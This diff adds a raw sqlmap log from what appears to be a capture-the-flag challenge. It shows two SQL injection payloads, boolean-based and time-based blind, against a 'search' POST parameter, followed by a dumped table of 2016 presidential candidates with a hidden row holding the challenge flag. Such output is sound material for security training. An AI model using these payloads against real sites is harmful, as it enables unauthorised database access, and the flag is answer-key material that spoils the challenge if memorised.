@@ -1,0 +1,28 @@
+sqlmap identified the following injection point(s) with a total of 163 HTTP(s) requests:
+---
+Parameter: #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: search=-1437') OR 1871=1871 AND ('NQDE'='NQDE
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: search=') AND (SELECT * FROM (SELECT(SLEEP(5)))jLzq) AND ('Gdzt'='Gdzt
+---
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.5.9
+back-end DBMS: MySQL 5.0.12
+Database: sctf_injection
+Table: candidates
+[6 entries]
++----+------+----------------------------------------------------------------------+---------------+---------+------------------------------------------------+---------+
+| id | hide | pic                                                                  | party         | last    | comment                                        | first   |
++----+------+----------------------------------------------------------------------+---------------+---------+------------------------------------------------+---------+
+| 1  | 0    | http://www.politics1.com/pix2/clinton-2016.jpg                       | Democratic    | Clinton | <blank>                                        | Hillary |
+| 2  | 0    | http://www.politics1.com/pix2/berniesanders.jpg                      | Democratic    | Sanders | <blank>                                        | Bernie  |
+| 3  | 0    | http://www.politics1.com/pix2/TedCruz.jpg                            | Republican    | Cruz    | <blank>                                        | Ted     |
+| 4  | 0    | http://www.politics1.com/pix2/Kasich16.jpg                           | Republican    | Kasich  | <blank>                                        | John    |
+| 5  | 0    | http://www.politics1.com/pix2/trump.jpg                              | \x02epublican | Trump   | <blank>                                        | Donald  |
+| 6  | 1    | https://rosettastoneweb.files.wordpress.com/2015/11/vforvendetta.jpg | Anonymous     | Hacker  | sctf{why_do_people_still_make_sites_like_this} | The     |
++----+------+----------------------------------------------------------------------+---------------+---------+------------------------------------------------+---------+
+
